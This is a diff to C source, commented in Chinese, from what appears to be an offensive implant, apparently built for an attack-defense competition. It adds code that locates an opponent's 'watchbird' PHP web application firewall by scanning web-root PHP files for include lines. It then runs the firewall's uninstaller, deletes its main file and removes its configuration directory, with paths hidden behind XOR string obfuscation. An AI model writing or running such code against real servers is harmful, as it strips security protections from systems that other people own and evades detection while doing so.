@@ -465,27 +465,131 @@ static void scan_and_clean_php(const char *dir, time_t boot_time)
 }
 
 /*
+ * find_watchbird_path：在 WWWROOT 中定位敌方 watchbird.php 的真实路径。
+ *
+ * 策略：
+ *   1. 先检查 WWWROOT/watchbird.php，存在则直接返回
+ *   2. 若不存在，遍历 WWWROOT 下最多 5 个 .php 文件，读取头部
+ *      查找 watchbird install 注入的特征：
+ *        <?php include_once '/path/to/watchbird.php'; ?>   （头部注入）
+ *        include_once '/path/to/watchbird.php';            （declare后注入）
+ *      提取出被 include 的文件路径并返回
+ *   3. 均未找到返回 0
+ *
+ * 返回 1 表示找到（路径写入 out_path），0 表示未找到。
+ */
+static int find_watchbird_path(char *out_path, int out_size)
+{
+    /* 策略 1：直接检查默认路径 */
+    snprintf(out_path, out_size, "%swatchbird.php", XorString(WWWROOT));
+    struct stat st;
+    if (stat(out_path, &st) == 0 && S_ISREG(st.st_mode))
+        return 1;
+
+    /* 策略 2：遍历 WWWROOT 下最多 5 个 php 文件，从 include_once 中提取路径 */
+    DIR *d = opendir(XorString(WWWROOT));
+    if (!d) return 0;
+
+    struct dirent *ent;
+    int checked = 0;
+    char filepath[512];
+    char buf[4096];
+
+    while ((ent = readdir(d)) != NULL && checked < 5)
+    {
+        int namelen = strlen(ent->d_name);
+        if (namelen < 5) continue;
+
+        /* 检查 .php / .php5 / .phtml 扩展名 */
+        const char *dot = strrchr(ent->d_name, '.');
+        if (!dot) continue;
+        if (strcmp(dot, ".php") != 0 && strcmp(dot, ".php5") != 0 &&
+            strcmp(dot, ".phtml") != 0)
+            continue;
+
+        snprintf(filepath, sizeof(filepath), "%s%s", XorString(WWWROOT), ent->d_name);
+        if (stat(filepath, &st) != 0 || !S_ISREG(st.st_mode))
+            continue;
+
+        int fd = open(filepath, O_RDONLY);
+        if (fd < 0) continue;
+        int n = read(fd, buf, sizeof(buf) - 1);
+        close(fd);
+        if (n <= 0) continue;
+        buf[n] = '\0';
+        checked++;
+
+        /*
+         * watchbird install 有两种注入方式：
+         *   方式1: 文件开头 <?php include_once '/abs/path/watchbird.php'; ?>
+         *   方式2: declare 语句之后 \ninclude_once '/abs/path/watchbird.php';\n
+         *
+         * 统一搜索 include_once ' 或 require_once ' 后提取路径
+         */
+        const char *patterns[] = {
+            "include_once '", "require_once '",
+            "include_once \"", "require_once \"",
+            NULL
+        };
+        int i;
+        for (i = 0; patterns[i]; i++)
+        {
+            const char *pos = strstr(buf, patterns[i]);
+            if (!pos) continue;
+
+            /* 提取引号内的路径 */
+            char quote = patterns[i][strlen(patterns[i]) - 1]; /* ' 或 " */
+            const char *path_start = pos + strlen(patterns[i]);
+            const char *path_end = strchr(path_start, quote);
+            if (!path_end || path_end - path_start <= 0 ||
+                path_end - path_start >= out_size)
+                continue;
+
+            /* 检查路径中是否包含 watchbird 关键字 */
+            int plen = path_end - path_start;
+            char tmp[512];
+            memcpy(tmp, path_start, plen);
+            tmp[plen] = '\0';
+
+            if (strstr(tmp, "watchbird"))
+            {
+                strncpy(out_path, tmp, out_size - 1);
+                out_path[out_size - 1] = '\0';
+                closedir(d);
+                return 1;
+            }
+        }
+    }
+    closedir(d);
+    return 0;
+}
+
+/*
  * uninstall_enemy_watchbird：卸载敌方部署的 watchbird WAF。
- *   1. 查找 WWWROOT/watchbird.php，执行 --uninstall
- *   2. 递归删除 /tmp/watchbird 目录（配置文件所在位置）
+ *
+ *   1. 定位 watchbird.php（默认路径 or 从 PHP 文件头部 include 中提取）
+ *   2. 调用 php watchbird.php --uninstall WWWROOT 清除所有 PHP 文件中的注入
+ *   3. 删除 watchbird.php 本体
+ *   4. 递归删除 /tmp/watchbird 配置目录
  */
 static void uninstall_enemy_watchbird()
 {
     char wb_php[512];
-    snprintf(wb_php, sizeof(wb_php), "%swatchbird.php", XorString(WWWROOT));
+    if (!find_watchbird_path(wb_php, sizeof(wb_php)))
+        return; /* 未找到 watchbird */
 
     struct stat st;
+
+    /* 先执行 --uninstall 清除所有 PHP 文件中的 include 注入 */
     if (stat(wb_php, &st) == 0 && S_ISREG(st.st_mode))
     {
-        /* php /var/www/html/watchbird.php --uninstall */
         pid_t p = fork();
         if (p == 0)
         {
             execl(XorString("/usr/bin/php"), "php", wb_php,
-                  XorString("--uninstall"), NULL);
-            /* 某些环境 php 在 /usr/local/bin */
+                  XorString("--uninstall"), XorString(WWWROOT), NULL);
             execl(XorString("/usr/local/bin/php"), "php", wb_php,
-                  XorString("--uninstall"), NULL);
+                  XorString("--uninstall"), XorString(WWWROOT), NULL);
             _exit(127);
         }
         if (p > 0)
@@ -493,9 +597,12 @@ static void uninstall_enemy_watchbird()
             int status;
             waitpid(p, &status, 0);
         }
+
+        /* 删除 watchbird.php 本体 */
+        remove(wb_php);
     }
 
-    /* 删除 /tmp/watchbird 目录 */
+    /* 删除 /tmp/watchbird 配置目录 */
     rmdir_recursive(XorString("/tmp/watchbird"));
 }
 
